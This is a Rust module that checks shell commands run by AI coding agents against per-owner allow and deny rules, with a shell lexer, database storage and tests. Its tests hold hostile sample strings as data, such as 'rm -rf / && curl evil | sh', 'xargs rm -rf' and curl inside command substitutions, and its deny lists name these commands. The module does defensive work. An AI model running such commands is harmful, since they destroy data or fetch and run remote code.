use anyhow::Result;
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use sqlx::FromRow;
use uuid::Uuid;

use crate::world::WorldStore;

pub const ENV: &str = "LOKA_COMMAND_RULES";

pub fn enforced_for(backend: &str) -> bool {
    matches!(backend, "claude" | "opencode")
}
pub const MAX_RULES_PER_OWNER: i64 = 200;
const MAX_WORDS: usize = 8;
const MAX_DEPTH: usize = 8;
const MAX_SCRIPT: usize = 256 * 1024;

const ALWAYS_ALLOWED: &[&str] = &[
    "cd", "pwd", "true", "false", "echo", "printf", "test", "[", "[[", "]]", "export", "unset", "set", "shopt", "setopt", "unsetopt",
    "read", "local", "declare", "typeset", "return", "exit", "break", "continue", "shift", "wait", "unalias", "type", "hash", "umask",
    ":", "{", "}", "!", "fi", "done", "esac", "then", "else", "do", "in",
];
const KEYWORDS: &[&str] = &["if", "then", "else", "elif", "do", "while", "until", "!", "{", "time"];
const HEADERS: &[&str] = &["for", "case", "select", "function"];
const TRANSPARENT: &[&str] = &["command", "builtin", "exec", "nohup", "time", "nice", "env", "timeout", "stdbuf", "xargs", "caffeinate", "noglob", "nocorrect"];
const SHELLS: &[&str] = &["bash", "sh", "zsh", "dash", "ksh"];

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Policy {
    #[serde(default)]
    pub allow: Vec<Vec<String>>,
    #[serde(default)]
    pub deny: Vec<Vec<String>>,
}

impl Policy {
    pub fn is_empty(&self) -> bool {
        self.allow.is_empty() && self.deny.is_empty()
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Blocked {
    pub command: String,
    pub reason: &'static str,
}

impl std::fmt::Display for Blocked {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "`{}` {}", self.command, self.reason)
    }
}

pub fn parse_rule(text: &str) -> std::result::Result<Vec<String>, &'static str> {
    let text = text.trim();
    if text.is_empty() || text.len() > 200 {
        return Err("a rule is 1 to 200 characters");
    }
    if text.chars().any(|c| matches!(c, ';' | '&' | '|' | '<' | '>' | '`' | '$' | '(' | ')' | '\n' | '\r' | '\\')) {
        return Err("a rule is a command and its first words, without shell symbols");
    }
    let mut words: Vec<String> = Vec::new();
    let mut current = String::new();
    let mut quote: Option<char> = None;
    for c in text.chars() {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (Some(_), c) => current.push(c),
            (None, '\'' | '"') => quote = Some(c),
            (None, c) if c.is_whitespace() => {
                if !current.is_empty() {
                    words.push(std::mem::take(&mut current));
                }
            }
            (None, c) => current.push(c),
        }
    }
    if quote.is_some() {
        return Err("a rule has an unclosed quote");
    }
    if !current.is_empty() {
        words.push(current);
    }
    while words.last().is_some_and(|word| word == "*") {
        words.pop();
    }
    if words.is_empty() || words.len() > MAX_WORDS {
        return Err("a rule is 1 to 8 words");
    }
    if words[0].contains('*') {
        return Err("a rule must start with the command's name");
    }
    Ok(words)
}

#[derive(Clone, Debug, Default)]
struct Word {
    text: String,
    dynamic: bool,
}

type Command = Vec<Word>;

struct Lexer<'a> {
    chars: Vec<char>,
    at: usize,
    depth: usize,
    found: &'a mut Vec<Command>,
}

fn basename(word: &str) -> &str {
    word.rsplit('/').next().unwrap_or(word)
}

impl Lexer<'_> {
    fn peek(&self, offset: usize) -> Option<char> {
        self.chars.get(self.at + offset).copied()
    }

    fn nested(&mut self, script: &str) -> std::result::Result<(), &'static str> {
        if self.depth >= MAX_DEPTH {
            return Err("nests commands too deeply to check");
        }
        let commands = extract(script, self.depth + 1)?;
        self.found.extend(commands);
        Ok(())
    }

    fn balanced(&mut self, open: char, close: char) -> std::result::Result<String, &'static str> {
        let mut depth = 1;
        let mut out = String::new();
        let mut quote: Option<char> = None;
        while let Some(c) = self.peek(0) {
            self.at += 1;
            match quote {
                Some('\'') if c == '\'' => quote = None,
                Some('"') if c == '"' => quote = None,
                Some('"') if c == '\\' => {
                    out.push(c);
                    if let Some(next) = self.peek(0) {
                        out.push(next);
                        self.at += 1;
                    }
                    continue;
                }
                Some(_) => {}
                None if c == '\'' || c == '"' => quote = Some(c),
                None if c == '\\' => {
                    out.push(c);
                    if let Some(next) = self.peek(0) {
                        out.push(next);
                        self.at += 1;
                    }
                    continue;
                }
                None if c == open => depth += 1,
                None if c == close => {
                    depth -= 1;
                    if depth == 0 {
                        return Ok(out);
                    }
                }
                None => {}
            }
            out.push(c);
        }
        Err("has an unclosed bracket")
    }

    fn backquoted(&mut self) -> std::result::Result<String, &'static str> {
        let mut out = String::new();
        while let Some(c) = self.peek(0) {
            self.at += 1;
            match c {
                '`' => return Ok(out),
                '\\' => {
                    if let Some(next) = self.peek(0) {
                        out.push(next);
                        self.at += 1;
                    }
                }
                c => out.push(c),
            }
        }
        Err("has an unclosed backquote")
    }

    fn dollar(&mut self, word: &mut Word) -> std::result::Result<(), &'static str> {
        word.dynamic = true;
        match self.peek(0) {
            Some('(') if self.peek(1) == Some('(') => {
                self.at += 2;
                let inner = self.balanced('(', ')')?;
                if self.peek(0) == Some(')') {
                    self.at += 1;
                }
                if inner.contains("$(") || inner.contains('`') {
                    self.nested(&inner)?;
                }
            }
            Some('(') => {
                self.at += 1;
                let inner = self.balanced('(', ')')?;
                self.nested(&inner)?;
            }
            Some('{') => {
                self.at += 1;
                let inner = self.balanced('{', '}')?;
                if inner.contains("$(") || inner.contains('`') {
                    self.nested(&inner)?;
                }
            }
            Some('\'') => {
                self.at += 1;
                while let Some(c) = self.peek(0) {
                    self.at += 1;
                    if c == '\\' {
                        self.at += 1;
                    } else if c == '\'' {
                        break;
                    }
                }
            }
            Some(c) if c.is_ascii_alphanumeric() || c == '_' => {
                while self.peek(0).is_some_and(|c| c.is_ascii_alphanumeric() || c == '_') {
                    self.at += 1;
                }
            }
            Some('@' | '*' | '#' | '?' | '-' | '$' | '!') => self.at += 1,
            _ => {
                word.text.push('$');
                word.dynamic = false;
            }
        }
        Ok(())
    }
}

#[derive(Default)]
struct Pending {
    heredocs: Vec<(String, bool)>,
}

#[allow(unused_assignments)]
fn extract(script: &str, depth: usize) -> std::result::Result<Vec<Command>, &'static str> {
    if script.len() > MAX_SCRIPT {
        return Err("is too long to check");
    }
    let mut found: Vec<Command> = Vec::new();
    let mut commands: Vec<Command> = Vec::new();
    {
        let mut lexer = Lexer { chars: script.chars().collect(), at: 0, depth, found: &mut found };
        let mut command: Command = Vec::new();
        let mut word = Word::default();
        let mut in_word = false;
        let mut skip_next = false;
        let mut heredoc_next = false;
        let mut pending = Pending::default();
        macro_rules! end_word {
            () => {{
                if in_word {
                    let done = std::mem::take(&mut word);
                    if heredoc_next {
                        let quoted = done.text.contains('\'') || done.text.contains('"');
                        let _ = quoted;
                        pending.heredocs.push((done.text.trim_matches(|c| c == '\'' || c == '"').to_string(), false));
                        heredoc_next = false;
                    } else if skip_next {
                        skip_next = false;
                    } else {
                        command.push(done);
                    }
                    in_word = false;
                }
            }};
        }
        macro_rules! end_command {
            () => {{
                end_word!();
                if !command.is_empty() {
                    commands.push(std::mem::take(&mut command));
                }
            }};
        }
        while let Some(c) = lexer.peek(0) {
            lexer.at += 1;
            match c {
                ' ' | '\t' => end_word!(),
                '\n' => {
                    end_command!();
                    for (delimiter, _) in std::mem::take(&mut pending.heredocs) {
                        loop {
                            let start = lexer.at;
                            while lexer.peek(0).is_some_and(|c| c != '\n') {
                                lexer.at += 1;
                            }
                            let line: String = lexer.chars[start..lexer.at].iter().collect();
                            if lexer.peek(0).is_some() {
                                lexer.at += 1;
                            }
                            if line.trim_start_matches('\t') == delimiter || lexer.peek(0).is_none() {
                                break;
                            }
                        }
                    }
                }
                ';' | '&' | '|' | '(' | ')' => end_command!(),
                '#' if !in_word => {
                    while lexer.peek(0).is_some_and(|c| c != '\n') {
                        lexer.at += 1;
                    }
                }
                '\\' => {
                    match lexer.peek(0) {
                        Some('\n') => lexer.at += 1,
                        Some(next) => {
                            word.text.push(next);
                            lexer.at += 1;
                            in_word = true;
                        }
                        None => {}
                    }
                }
                '\'' => {
                    in_word = true;
                    loop {
                        match lexer.peek(0) {
                            Some('\'') => {
                                lexer.at += 1;
                                break;
                            }
                            Some(c) => {
                                word.text.push(c);
                                lexer.at += 1;
                            }
                            None => return Err("has an unclosed quote"),
                        }
                    }
                }
                '"' => {
                    in_word = true;
                    loop {
                        match lexer.peek(0) {
                            Some('"') => {
                                lexer.at += 1;
                                break;
                            }
                            Some('\\') => {
                                lexer.at += 1;
                                if let Some(next) = lexer.peek(0) {
                                    word.text.push(next);
                                    lexer.at += 1;
                                }
                            }
                            Some('$') => {
                                lexer.at += 1;
                                lexer.dollar(&mut word)?;
                            }
                            Some('`') => {
                                lexer.at += 1;
                                word.dynamic = true;
                                let inner = lexer.backquoted()?;
                                lexer.nested(&inner)?;
                            }
                            Some(c) => {
                                word.text.push(c);
                                lexer.at += 1;
                            }
                            None => return Err("has an unclosed quote"),
                        }
                    }
                }
                '$' => {
                    in_word = true;
                    lexer.dollar(&mut word)?;
                }
                '`' => {
                    in_word = true;
                    word.dynamic = true;
                    let inner = lexer.backquoted()?;
                    lexer.nested(&inner)?;
                }
                '<' | '>' => {
                    if lexer.peek(0) == Some('(') {
                        lexer.at += 1;
                        let inner = lexer.balanced('(', ')')?;
                        lexer.nested(&inner)?;
                        in_word = true;
                        word.dynamic = true;
                        continue;
                    }
                    if in_word && !word.dynamic && word.text.chars().all(|c| c.is_ascii_digit()) {
                        word = Word::default();
                        in_word = false;
                    } else {
                        end_word!();
                    }
                    if c == '<' && lexer.peek(0) == Some('<') && lexer.peek(1) == Some('<') {
                        lexer.at += 2;
                        skip_next = true;
                    } else if c == '<' && lexer.peek(0) == Some('<') {
                        lexer.at += 1;
                        if lexer.peek(0) == Some('-') {
                            lexer.at += 1;
                        }
                        heredoc_next = true;
                    } else {
                        while matches!(lexer.peek(0), Some('>' | '<' | '|' | '&')) {
                            lexer.at += 1;
                        }
                        if lexer.peek(0).is_some_and(|c| c.is_ascii_digit()) && lexer.chars.get(lexer.at - 1) == Some(&'&') {
                            while lexer.peek(0).is_some_and(|c| c.is_ascii_digit() || c == '-') {
                                lexer.at += 1;
                            }
                        } else if lexer.chars.get(lexer.at - 1) == Some(&'&') && lexer.peek(0) == Some('-') {
                            lexer.at += 1;
                        } else {
                            skip_next = true;
                        }
                    }
                }
                c => {
                    word.text.push(c);
                    in_word = true;
                }
            }
        }
        end_command!();
        if heredoc_next || skip_next {
            return Err("ends in the middle of a redirection");
        }
    }
    found.extend(commands);
    Ok(found)
}

fn is_assignment(word: &Word) -> bool {
    let Some((name, _)) = word.text.split_once('=') else { return false };
    !name.is_empty() && name.chars().next().is_some_and(|c| c.is_ascii_alphabetic() || c == '_') && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

fn glob(pattern: &str, text: &str) -> bool {
    match pattern.split_once('*') {
        None => pattern == text,
        Some((head, tail)) => {
            let Some(rest) = text.strip_prefix(head) else { return false };
            if tail.is_empty() {
                return true;
            }
            (0..=rest.len()).filter(|&i| rest.is_char_boundary(i)).any(|i| glob(tail, &rest[i..]))
        }
    }
}

fn matches(rule: &[String], words: &[Word]) -> bool {
    if words.len() < rule.len() {
        return false;
    }
    rule.iter().zip(words).enumerate().all(|(index, (pattern, word))| {
        if word.dynamic {
            return false;
        }
        let text = if index == 0 { basename(&word.text) } else { word.text.as_str() };
        let pattern = if index == 0 { basename(pattern) } else { pattern.as_str() };
        glob(pattern, text)
    })
}

fn shown(words: &[Word]) -> String {
    let text = words.iter().map(|w| if w.dynamic { "$…" } else { w.text.as_str() }).collect::<Vec<_>>().join(" ");
    let mut text: String = text.chars().take(120).collect();
    if words.iter().map(|w| w.text.len() + 1).sum::<usize>() > 120 {
        text.push('…');
    }
    text
}

fn wrapped(words: &[Word]) -> Option<(usize, Option<String>)> {
    let first = basename(&words[0].text);
    if first == "eval" {
        return None;
    }
    if SHELLS.contains(&first) {
        let at = words.iter().position(|w| !w.dynamic && w.text.starts_with('-') && !w.text.starts_with("--") && w.text.contains('c'))?;
        return words.get(at + 1).map(|script| (words.len(), (!script.dynamic).then(|| script.text.clone()).or(Some(String::new()))));
    }
    if !TRANSPARENT.contains(&first) && first != "sudo" && first != "doas" {
        return None;
    }
    let mut index = 1;
    while let Some(word) = words.get(index) {
        let text = word.text.as_str();
        let option_value = matches!((first, text), ("nice", "-n") | ("sudo", "-u" | "-g" | "-C" | "-D") | ("timeout", "-s" | "-k" | "--signal" | "--kill-after") | ("xargs", "-n" | "-L" | "-P" | "-s" | "-I" | "-E" | "-d" | "-a"));
        if text.starts_with('-') && !word.dynamic {
            index += if option_value { 2 } else { 1 };
            continue;
        }
        if first == "env" && is_assignment(word) {
            index += 1;
            continue;
        }
        if first == "timeout" && index == 1 + words[1..].iter().take_while(|w| w.text.starts_with('-')).count() {
            index += 1;
            continue;
        }
        break;
    }
    Some((index, None))
}

fn check_command(policy: &Policy, words: &[Word], depth: usize) -> std::result::Result<(), Blocked> {
    let mut words: Vec<Word> = words.iter().skip_while(|w| is_assignment(w)).cloned().collect();
    while words.first().is_some_and(|w| !w.dynamic && KEYWORDS.contains(&w.text.as_str())) {
        words.remove(0);
    }
    let Some(first) = words.first() else { return Ok(()) };
    if !first.dynamic && HEADERS.contains(&first.text.as_str()) {
        return Ok(());
    }
    if first.dynamic {
        return Err(Blocked { command: shown(&words), reason: "runs a command whose name is only known when it runs, which command rules cannot check" });
    }
    if depth > MAX_DEPTH {
        return Err(Blocked { command: shown(&words), reason: "nests commands too deeply to check" });
    }
    if policy.deny.iter().any(|rule| matches(rule, &words)) {
        return Err(Blocked { command: shown(&words), reason: "matches a blocked command rule" });
    }
    let name = basename(&first.text);
    if name == "eval" {
        if words[1..].iter().any(|w| w.dynamic) {
            return Err(Blocked { command: shown(&words), reason: "evaluates text only known when it runs, which command rules cannot check" });
        }
        let script = words[1..].iter().map(|w| w.text.as_str()).collect::<Vec<_>>().join(" ");
        return check_script(policy, &script, depth + 1);
    }
    if matches!(name, "source" | ".") {
        let snapshot = words.get(1).is_some_and(|w| !w.dynamic && w.text.contains("/shell-snapshots/"));
        if snapshot || policy.allow.is_empty() || policy.allow.iter().any(|rule| matches(rule, &words)) {
            return Ok(());
        }
        return Err(Blocked { command: shown(&words), reason: "runs a script file that is not on the allowed command rules" });
    }
    if name == "trap" {
        if let Some(action) = words.get(1).filter(|w| !w.dynamic) {
            check_script(policy, &action.text, depth + 1)?;
        }
        return Ok(());
    }
    if let Some((rest, script)) = wrapped(&words) {
        let gated = matches!(name, "sudo" | "doas");
        if gated && !policy.allow.is_empty() && !policy.allow.iter().any(|rule| matches(rule, &words)) {
            return Err(Blocked { command: shown(&words), reason: "is not on the allowed command rules" });
        }
        if let Some(script) = script {
            if script.is_empty() {
                return Err(Blocked { command: shown(&words), reason: "runs shell text only known when it runs, which command rules cannot check" });
            }
            return check_script(policy, &script, depth + 1);
        }
        if rest < words.len() {
            return check_command(policy, &words[rest..], depth + 1);
        }
        return Ok(());
    }
    if policy.allow.is_empty() || ALWAYS_ALLOWED.contains(&name) || policy.allow.iter().any(|rule| matches(rule, &words)) {
        return Ok(());
    }
    Err(Blocked { command: shown(&words), reason: "is not on the allowed command rules" })
}

fn check_script(policy: &Policy, script: &str, depth: usize) -> std::result::Result<(), Blocked> {
    let commands = extract(script, depth).map_err(|reason| Blocked { command: script.chars().take(80).collect(), reason })?;
    for command in &commands {
        check_command(policy, command, depth)?;
    }
    Ok(())
}

pub fn check(policy: &Policy, script: &str) -> std::result::Result<(), Blocked> {
    if policy.is_empty() {
        return Ok(());
    }
    check_script(policy, script, 0)
}

pub fn check_shell_args(policy: &Policy, args: &[String]) -> std::result::Result<(), Blocked> {
    if policy.is_empty() {
        return Ok(());
    }
    let mut index = 0;
    while let Some(arg) = args.get(index) {
        if arg == "--" {
            index += 1;
            break;
        }
        if arg.starts_with('-') && !arg.starts_with("--") && arg.contains('c') {
            let mut rest = args[index + 1..].iter().skip_while(|a| a.starts_with('-') && a.as_str() != "--");
            let script = match rest.next() {
                Some(dashes) if dashes == "--" => rest.next(),
                other => other,
            };
            return match script {
                Some(script) => check(policy, script),
                None => Err(Blocked { command: args.join(" "), reason: "starts a shell without a command, which command rules cannot check" }),
            };
        }
        if arg.starts_with('-') || arg.starts_with('+') {
            index += 1;
            continue;
        }
        break;
    }
    if policy.allow.is_empty() && args.get(index).is_none() {
        return Ok(());
    }
    Err(Blocked { command: args.join(" ").chars().take(80).collect(), reason: "starts a shell without a command, which command rules cannot check" })
}

#[derive(Clone, Debug, FromRow, Serialize)]
pub struct CommandRule {
    pub id: Uuid,
    pub agent_id: Option<Uuid>,
    pub kind: String,
    pub rule: String,
    pub created_by: String,
    pub created_at: DateTime<Utc>,
}

#[derive(Debug, PartialEq, Eq)]
pub enum RuleError {
    Invalid(&'static str),
    NotYourAgent,
    TooMany,
}

impl std::fmt::Display for RuleError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            RuleError::Invalid(reason) => f.write_str(reason),
            RuleError::NotYourAgent => f.write_str("that agent is not yours"),
            RuleError::TooMany => write!(f, "you can have at most {MAX_RULES_PER_OWNER} command rules"),
        }
    }
}

pub fn normalized(words: &[String]) -> String {
    words
        .iter()
        .map(|w| if w.chars().any(char::is_whitespace) { format!("'{w}'") } else { w.clone() })
        .collect::<Vec<_>>()
        .join(" ")
}

impl WorldStore {
    pub async fn list_command_rules(&self, owner: Uuid) -> Result<Vec<CommandRule>> {
        Ok(sqlx::query_as::<_, CommandRule>(
            "SELECT id, agent_id, kind, rule, created_by, created_at FROM world_command_rules
             WHERE owner_user_id = $1 ORDER BY agent_id NULLS FIRST, kind, rule",
        )
        .bind(owner)
        .fetch_all(self.pool())
        .await?)
    }

    pub async fn add_command_rule(
        &self,
        owner: Uuid,
        agent_id: Option<Uuid>,
        kind: &str,
        rule: &str,
        by: &str,
    ) -> Result<std::result::Result<CommandRule, RuleError>> {
        if !matches!(kind, "allow" | "deny") {
            return Ok(Err(RuleError::Invalid("a rule is allow or deny")));
        }
        let words = match parse_rule(rule) {
            Ok(words) => words,
            Err(reason) => return Ok(Err(RuleError::Invalid(reason))),
        };
        let rule = normalized(&words);
        let mut tx = self.pool().begin().await?;
        sqlx::query("SELECT pg_advisory_xact_lock(hashtext('command_rules:' || $1::text))").bind(owner).execute(&mut *tx).await?;
        if let Some(agent) = agent_id {
            let mine: Option<i32> = sqlx::query_scalar("SELECT 1 FROM agent_profiles WHERE id = $1 AND owner_user_id = $2")
                .bind(agent)
                .bind(owner)
                .fetch_optional(&mut *tx)
                .await?;
            if mine.is_none() {
                return Ok(Err(RuleError::NotYourAgent));
            }
        }
        let count: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM world_command_rules WHERE owner_user_id = $1")
            .bind(owner)
            .fetch_one(&mut *tx)
            .await?;
        if count >= MAX_RULES_PER_OWNER {
            return Ok(Err(RuleError::TooMany));
        }
        let saved = sqlx::query_as::<_, CommandRule>(
            "INSERT INTO world_command_rules (owner_user_id, agent_id, kind, rule, created_by)
             VALUES ($1, $2, $3, $4, $5)
             ON CONFLICT (owner_user_id, COALESCE(agent_id, '00000000-0000-0000-0000-000000000000'::uuid), kind, rule)
             DO UPDATE SET created_by = world_command_rules.created_by
             RETURNING id, agent_id, kind, rule, created_by, created_at",
        )
        .bind(owner)
        .bind(agent_id)
        .bind(kind)
        .bind(&rule)
        .bind(by)
        .fetch_one(&mut *tx)
        .await?;
        tx.commit().await?;
        Ok(Ok(saved))
    }

    pub async fn remove_command_rule(&self, owner: Uuid, id: Uuid) -> Result<bool> {
        Ok(sqlx::query("DELETE FROM world_command_rules WHERE owner_user_id = $1 AND id = $2")
            .bind(owner)
            .bind(id)
            .execute(self.pool())
            .await?
            .rows_affected()
            > 0)
    }

    pub async fn command_policy_for_agent(&self, agent_id: Uuid) -> Result<Policy> {
        let rows: Vec<(String, String)> = sqlx::query_as(
            "SELECT r.kind, r.rule FROM world_command_rules r
             JOIN agent_profiles a ON a.id = $1 AND a.owner_user_id = r.owner_user_id
             WHERE r.agent_id IS NULL OR r.agent_id = $1
             ORDER BY r.kind, r.rule",
        )
        .bind(agent_id)
        .fetch_all(self.pool())
        .await?;
        let mut policy = Policy::default();
        for (kind, rule) in rows {
            let Ok(words) = parse_rule(&rule) else { continue };
            if kind == "allow" {
                policy.allow.push(words);
            } else {
                policy.deny.push(words);
            }
        }
        Ok(policy)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn policy(allow: &[&str], deny: &[&str]) -> Policy {
        Policy {
            allow: allow.iter().map(|r| parse_rule(r).unwrap()).collect(),
            deny: deny.iter().map(|r| parse_rule(r).unwrap()).collect(),
        }
    }

    #[tokio::test]
    async fn rules_belong_to_their_owner() -> Result<()> {
        let Ok(url) = std::env::var("KEYS_TEST_DATABASE_URL") else {
            return Ok(());
        };
        let pool = sqlx::postgres::PgPoolOptions::new().max_connections(2).connect(&url).await?;
        let store = WorldStore::new(pool.clone());
        let tag = Uuid::new_v4().simple().to_string();
        let mut people = Vec::new();
        for who in ["owner", "other"] {
            let id: Uuid = sqlx::query_scalar("INSERT INTO users (email, world_role) VALUES ($1, 'write') RETURNING id")
                .bind(format!("rules-{who}-{tag}@test.dev"))
                .fetch_one(&pool)
                .await?;
            crate::orgs::join_default_for_tests(&pool, id, None).await?;
            people.push(id);
        }
        let (owner, other) = (people[0], people[1]);
        let mut agents = Vec::new();
        for (who, person) in [("mine", owner), ("theirs", other)] {
            let id: Uuid = sqlx::query_scalar(
                "INSERT INTO agent_profiles (slug, name, cli, model, owner_user_id) VALUES ($1, $1, 'claude', 'opus', $2) RETURNING id",
            )
            .bind(format!("rules-{who}-{tag}"))
            .bind(person)
            .fetch_one(&pool)
            .await?;
            agents.push(id);
        }
        let (mine, theirs) = (agents[0], agents[1]);
        assert!(store.command_policy_for_agent(mine).await?.is_empty());
        assert_eq!(store.add_command_rule(owner, Some(theirs), "deny", "rm", "person").await?.unwrap_err(), RuleError::NotYourAgent);
        assert!(matches!(store.add_command_rule(owner, None, "deny", "rm; ls", "person").await?, Err(RuleError::Invalid(_))));
        assert!(matches!(store.add_command_rule(owner, None, "maybe", "rm", "person").await?, Err(RuleError::Invalid(_))));
        let everyone = store.add_command_rule(owner, None, "deny", "git push", "person").await?.unwrap();
        store.add_command_rule(owner, Some(mine), "allow", "npm test", "agent:main").await?.unwrap();
        store.add_command_rule(owner, Some(mine), "allow", "npm   test *", "person").await?.unwrap();
        let policy = store.command_policy_for_agent(mine).await?;
        assert_eq!(policy.deny, vec![vec!["git".to_string(), "push".to_string()]]);
        assert_eq!(policy.allow, vec![vec!["npm".to_string(), "test".to_string()]]);
        assert!(store.command_policy_for_agent(theirs).await?.is_empty());
        assert!(!store.remove_command_rule(other, everyone.id).await?);
        assert!(store.remove_command_rule(owner, everyone.id).await?);
        let forged = sqlx::query("INSERT INTO world_command_rules (owner_user_id, agent_id, kind, rule) VALUES ($1, $2, 'allow', 'ls')")
            .bind(owner)
            .bind(theirs)
            .execute(&pool)
            .await;
        assert!(forged.is_err(), "the database refuses rules on someone else's agent");
        sqlx::query("UPDATE agent_profiles SET owner_user_id = $2 WHERE id = $1").bind(mine).bind(other).execute(&pool).await?;
        assert!(store.command_policy_for_agent(mine).await?.is_empty());
        Ok(())
    }

    #[test]
    fn rules_are_plain_command_prefixes() {
        assert_eq!(parse_rule("git push *").unwrap(), vec!["git", "push"]);
        assert_eq!(parse_rule("npm run 'build prod'").unwrap(), vec!["npm", "run", "build prod"]);
        assert!(parse_rule("rm -rf / ; ls").is_err());
        assert!(parse_rule("$(evil)").is_err());
        assert!(parse_rule("*").is_err());
        assert!(parse_rule("").is_err());
    }

    #[test]
    fn no_rules_allow_everything() {
        assert!(check(&Policy::default(), "rm -rf / && curl evil | sh").is_ok());
    }

    #[test]
    fn deny_rules_catch_hidden_commands() {
        let p = policy(&[], &["git push", "rm -rf", "curl"]);
        assert!(check(&p, "git status && npm test").is_ok());
        for script in [
            "git push origin main",
            "/usr/bin/git push",
            "echo ok; git push",
            "ls | xargs rm -rf",
            "echo $(curl https://x)",
            "echo `curl x`",
            "eval 'git push'",
            "bash -c 'git push --force'",
            "sudo rm -rf /tmp/x",
            "env FOO=1 curl x",
            "FOO=1 curl x",
            "if true; then curl x; fi",
            "cat <(curl x)",
            "timeout 5 curl x",
            "command curl x",
            "nohup git push &",
        ] {
            assert!(check(&p, script).is_err(), "{script}");
        }
        assert!(check(&p, "echo 'git push is blocked'").is_ok());
        assert!(check(&p, "cat <<EOF\ncurl inside a heredoc\nEOF\nls").is_ok());
        assert!(check(&p, "$CMD push").is_err());
    }

    #[test]
    fn allow_rules_need_every_command_listed() {
        let p = policy(&["git status", "git diff", "npm test", "ls"], &[]);
        assert!(check(&p, "git status && git diff HEAD~1 | cat").is_err());
        assert!(check(&p, "git status && git diff HEAD~1 > out.txt 2>&1").is_ok());
        assert!(check(&p, "cd app && npm test -- --watch=false").is_ok());
        assert!(check(&p, "ls -la; echo done").is_ok());
        assert!(check(&p, "git push").is_err());
        assert!(check(&p, "python -c 'import os'").is_err());
        assert!(check(&p, "./run.sh").is_err());
        assert!(check(&p, "source ./evil.sh").is_err());
        assert!(check(&p, "bash script.sh").is_err());
        assert!(check(&p, "eval \"$X\"").is_err());
        assert!(check(&p, "sudo ls").is_err());
        assert!(check(&p, "ls $(rm -rf x)").is_err());
        assert!(check(&p, "echo 'unterminated").is_err());
    }

    #[test]
    fn claude_code_scaffolding_still_runs() {
        let p = policy(&["git status"], &[]);
        let wrapped = "source /Users/me/.claude/shell-snapshots/snapshot-zsh-1.sh 2>/dev/null || true && setopt NO_EXTENDED_GLOB 2>/dev/null || true && eval 'git status' < /dev/null && pwd -P >| /var/folders/x/claude-ab-cwd";
        assert!(check(&p, wrapped).is_ok());
        let blocked = "source /Users/me/.claude/shell-snapshots/snapshot-zsh-1.sh 2>/dev/null || true && eval 'git push' < /dev/null && pwd -P >| /tmp/x";
        assert!(check(&p, blocked).is_err());
        assert!(check_shell_args(&p, &["-c".into(), "-l".into(), "git status".into()]).is_ok());
        assert!(check_shell_args(&p, &["-c".into(), "-l".into(), "git push".into()]).is_err());
        assert!(check_shell_args(&p, &["-c".into(), "-l".into()]).is_err());
        assert!(check_shell_args(&p, &["-l".into(), "-c".into(), "git status".into()]).is_ok());
        assert!(check_shell_args(&p, &["-lc".into(), "git push".into()]).is_err());
        assert!(check_shell_args(&p, &["script.sh".into()]).is_err());
        assert!(check_shell_args(&Policy::default(), &["script.sh".into()]).is_ok());
    }
}
